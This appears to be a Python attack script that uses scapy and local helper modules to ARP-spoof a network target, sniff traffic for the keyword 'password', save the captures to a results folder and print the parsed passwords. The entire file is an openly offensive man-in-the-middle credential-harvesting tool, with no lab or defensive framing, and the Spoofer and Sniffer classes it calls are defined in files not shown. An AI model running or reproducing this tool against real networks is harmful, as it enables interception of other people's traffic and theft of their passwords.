#!/usr/bin/python

from scapy.all import *
from utils.network import *
from utils.tools import *
import socket, struct
import argparse
import sys
from threading import *

thread_list = []
address = preset_arp_spoofing(True)
th_spoofer = Spoofer(address[0], address[1], address[2], address[3])
try:
    th_spoofer.start()
except KeyboardInterrupt:
    raise
th_sniffer= Sniffer(address[3],"password","./result/scanNetwork/password_sniffed")
thread_list.append(th_sniffer)
print(colors.CLEAR+colors.OKBLUE+colors.BOLD+"Stay quiet we listening the network"+colors.ENDC)
th_sniffer.start()

th_sniffer.join()
th_spoofer.stop()

print(colors.CLEAR)
password_parser("./result/scanNetwork/password_sniffed","./result/scanNetwork/password_sniffed_proper.txt")
print_file("./result/scanNetwork/password_sniffed_proper.txt",4)
